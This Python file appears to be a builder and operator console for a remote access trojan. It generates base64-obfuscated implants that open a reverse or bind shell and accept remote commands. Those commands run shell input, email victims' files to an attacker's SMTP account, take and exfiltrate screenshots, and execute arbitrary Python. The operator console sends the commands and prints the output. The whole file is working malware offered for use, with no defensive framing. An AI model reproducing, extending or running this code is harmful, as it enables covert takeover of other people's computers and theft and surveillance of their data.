import socket
import base64

controlled_codes = {
    "shell":[
"""
import subprocess
""","""
def Shell(cmd:str) -> None:
    try:
        shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        out = f"{shell.stdout.read().decode()}{shell.stderr.read().decode()}"
        if out == "":
            out = " "
    except:
        out = "Failed to get standard input and standard error!"
    return out
""","""
            %s cmd[0]=="shell" and len(cmd)!=1:
                controlled_socket.send(Shell(cmd[1]).encode())
"""
    ],"get":[
"""
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
""","""
def Get(filename:str) -> None:
    global host,port,username,password
    out = "The transfer was successful"
    try:
        msg = MIMEMultipart()
        file = MIMEText(open(filename,"rb").read(),"base64","utf-8")
        file["Content-Type"] = "application/octet-stream"
        file["Content-Disposition"] = "attachment;filename = " + filename
        msg.attach(file)
    except:
        out = "Sorry The file seems untransportable"
    try:
        smtp = smtplib.SMTP()
        smtp.connect(host,port)
        smtp.login(username,password)
        smtp.sendmail(username,username,msg.as_string())
        smtp.close()
    except:
        out = "Transfer failed Please check your variable value settings"
    return out
""","""
            %s cmd[0]=="get" and len(cmd)!=1:
                controlled_socket.send(Get(cmd[1]).encode())
"""
    ],"win":[
"""
from os import remove
from tkinter import Tk
from PIL import ImageGrab
""","""
def Win() -> None:
    out = "The transfer was successful"
    try:
        windown = Tk()
        jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
        jpg.save(".win.jpg")
        Get(".win.jpg")
        remove(".win.jpg")
    except:
        out = "Transfer failed Please check your variable value settings"
    return out
""","""
            %s cmd[0]=="win" and len(cmd)==1:
                controlled_socket.send(Win().encode())
"""
    ],"py":[
"",
"",
"""
            %s cmd[0]=="py" and len(cmd)!=1:
                try:
                    exec(cmd[1])
                    out = "Command execution succeeded"
                except:
                    out = "Command execution failed"
                controlled_socket.send(out.encode())
"""
    ]
}

def generate(i:int,src:str,ip:str,port:int,parameters:list[str]) -> None:
    controlled_code = "import socket"
    
    if i == 0:
        for j in range(2):
            for parameter in parameters:
                controlled_code += controlled_codes[parameter][j]
        controlled_code += f"""
if "__main__" == __name__:
    controlled_socket = socket.socket()
    try:
        controlled_socket.connect(("{ip}",{str(port)}))
        while True:
            cmd = controlled_socket.recv(2048).decode().split(" ",1)
        """
        controlled_code += controlled_codes[parameters[0]][2] % "if"
        for parameter in parameters[1:len(parameters)]:
            controlled_code += controlled_codes[parameter][2] % "elif"
        controlled_code += """
            else:
               controlled_socket.send("You entered a command or parameter incorrectly".encode())
    except:
        exit(0)   
        """
    
    elif i == 1:
        for j in range(2):
            for parameter in parameters:
                controlled_code += controlled_codes[parameter][j]
        controlled_code += f"""
if "__main__" == __name__:
    controlled_socket = socket.socket()
    controlled_socket.bind(("{ip}",{str(port)}))
    controlled_socket.listen()
    try:
        control_socket,addr = controlled_socket.accept()
        while True:
            cmd = control_socket.recv(2048).decode().split(" ",1)
        """
        controlled_code += controlled_codes[parameters[0]][2] % "if"
        for parameter in parameters[1:len(parameters)]:
            controlled_code += controlled_codes[parameter][2] % "elif"
        controlled_code += """
            else:
               control_socket.send("You entered a command or parameter incorrectly".encode()) 
    except:
        exit(0)   
        """
    
    file = open(src,"w+")
    file.write(f"""
import base64
exec(base64.b64decode({base64.b64encode(controlled_code.encode())}))
    """)
    file.close()

class Control:
    
    def __init__(self,ip:str,port:int) -> None:
        self.control_socket = socket.socket()
        self.ip = ip
        self.port = port

    def connect(self) -> None:
        try:
            self.control_socket.connect((self.ip,self.port))
            while True:
                cmd = input(f"{self.ip} $>")
                if cmd == "":
                    print("Don't send empty cmd!")
                else:
                    self.control_socket.send(cmd.encode())
                    out = self.control_socket.recv(2048).decode()
                    print(out)
        except:
            print("controlled close!")
            self.control_socket.close()

    def listen(self) -> None:
        try:
            self.control_socket.bind((self.ip,self.port))
            self.control_socket.listen()
            print(f"Listening port {self.port}")
            controlled_socket,addr = self.control_socket.accept()
            while True:
                cmd = input(f"{addr[0]} $>")
                if cmd == "":
                    print("Don't send empty cmd!")
                else:
                    controlled_socket.send(cmd.encode())
                    out = controlled_socket.recv(2048).decode()
                    print(out)
        except:
            print("controlled close!")
            self.control_socket.close()

            
